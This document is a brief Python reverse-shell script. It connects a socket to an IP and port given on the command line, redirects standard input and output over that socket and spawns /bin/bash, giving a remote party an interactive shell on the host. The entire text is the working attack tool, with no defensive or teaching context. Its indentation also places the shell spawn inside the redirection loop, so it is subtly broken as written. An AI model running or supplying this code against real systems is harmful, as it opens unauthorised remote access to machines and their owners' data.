#!/usr/bin/env python3

import os
import pty
import socket
import sys

if len(sys.argv) != 3:
    print("error: missing ip or port value", file=sys.stderr)
    print("usage: %s <ip> <port>" % sys.argv[0])
    exit(1)

ip, port = sys.argv[1:]

sock = socket.socket()
sock.connect((ip, int(port)))

for fd in range(0, 3):
        os.dup2(sock.fileno(), fd)

        pty.spawn("/bin/bash")